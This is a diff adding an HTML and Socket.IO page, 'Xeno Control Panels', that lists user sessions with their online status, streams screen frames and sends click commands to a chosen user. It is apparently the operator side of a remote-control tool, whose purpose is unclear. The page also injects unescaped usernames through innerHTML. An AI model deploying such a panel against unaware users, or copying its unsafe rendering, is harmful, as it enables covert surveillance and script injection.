@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Xeno Panels</title>
+    <style>body{font-family:Arial;margin:20px;background:#222;color:white;}.session{background:#333;border-radius:8px;padding:15px;margin:10px 0;cursor:pointer;transition:background 0.3s;}.session:hover{background:#444;}#control-panel{display:none;background:#111;padding:20px;border-radius:8px;}#screen{width:100%;max-height:500px;background:#000;border-radius:5px;}button{padding:10px 20px;margin:5px;background:#007bff;color:white;border:none;border-radius:5px;cursor:pointer;}</style>
+</head>
+<body>
+    <h1>🖥️ Xeno Control Panels</h1>
+    <button onclick="loadSessions()">🔄 Refresh</button>
+    <div id="sessions"></div>
+    
+    <div id="control-panel">
+        <h2>Controlling: <span id="current-user"></span></h2>
+        <div id="screen-preview">Screen stream will appear here</div>
+        <br>
+        <button onclick="sendTest()">📱 Send Test Command</button>
+        <button onclick="loadSessions()">← Back to List</button>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+    let currentSession;
+    const socket = io();
+    
+    async function loadSessions() {
+      const res = await fetch('/api/panels');
+      const sessions = await res.json();
+      document.getElementById('sessions').innerHTML = 
+        sessions.map(s => `<div class="session" onclick="connectTo('${s.userId}')">
+          👤 ${s.username || 'Unknown'} (${s.userId.slice(0,8)})
+          <span style="float:right;color:${s.activeSockets?.size>0?'#0f0':'#f00'}">
+            ${s.activeSockets?.size>0?'🟢 ONLINE':'🔴 OFFLINE'}
+          </span>
+        </div>`).join('') || '<p>No sessions yet. Wait for signups!</p>';
+    }
+    
+    function connectTo(userId) {
+      currentSession = userId;
+      document.getElementById('sessions').style.display = 'none';
+      document.getElementById('control-panel').style.display = 'block';
+      document.getElementById('current-user').textContent = userId;
+      socket.emit('join-panel', userId);
+      
+      socket.on('screen-update', (data) => {
+        document.getElementById('screen-preview').textContent = `📸 Frame: ${data.data}`;
+      });
+    }
+    
+    function sendTest() {
+      socket.emit('control-command', {type: 'click', target: currentSession});
+    }
+    
+    setInterval(loadSessions, 3000);
+    loadSessions();
+    </script>
+</body>
+</html>
